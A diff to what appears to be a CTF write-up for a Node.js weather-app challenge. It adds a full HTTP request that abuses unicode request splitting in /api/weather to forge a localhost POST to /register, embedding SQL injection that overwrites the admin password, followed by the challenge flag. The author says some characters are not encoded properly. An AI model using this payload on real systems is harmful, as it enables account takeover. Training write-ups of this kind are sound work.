@@ -58,7 +58,23 @@ A pit of eternal darkness, a mindless journey of abeyance, this feels like a nev
 
 - This challenge comes with docker files, so set the system up on localhost and test it out.
 
-- For the `POST /register` thing, we have the following `if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1')`. From this [link](https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs), it is clear that we are stripping ::ffff: from the remote address. From the checks done on localhost, the defaults are IPv4. The way to bypass this be SSRF wherein we fool the server into believing the request for registration came from the server itself. This [link](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) speaks of a security bug in unicode unwrapping in http.get() for node 8 or less, exactly the thing used in the application at `/api/weather`. 
+- For the `POST /register` thing, we have the following `if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1')`. From this [link](https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs), it is clear that we are stripping ::ffff: from the remote address. From the checks done on localhost, the defaults are IPv4. The way to bypass this be SSRF wherein we fool the server into believing the request for registration came from the server itself. This [link](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) speaks of a security bug in unicode unwrapping in http.get() for node 8 or less, exactly the thing used in the application at `/api/weather`. Through a simple `console.log(http.get(url).output);` in HTTPHelper.js, monitoring of the request can be done.
+
+- Observation made: HTTP control characters are URL encoded. 
+
+```s
+POST /api/weather HTTP/1.1
+Host: ip:port
+User-Agent: cGFzcw==
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 462
+Connection: close
+
+endpoint=127.0.0.1:80&city=ĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊConnection:Ġkeep-aliveĊĊĊPOSTĠ/registerĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊContent-Type:Ġapplication/x-www-form-urlencodedĊUser-Agent:ĠMozilla/5.0Ġ(X11;ĠLinuxĠx86_64;Ġrv:85.0)ĠGecko/20100101ĠFirefox/85.0ĊConnection:Ġkeep-aliveĊContent-Length:Ġ110ĊĊusername=adminĦpassword=admin%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27pass%27%20--+-ĊĊGETĠ/?&country=register
+```
+**Some characters haven't been encoded properly**
+
+Flag: HTB{w3lc0m3_t0_th3_p1p3_dr34m}
 
 ## OSINT
 
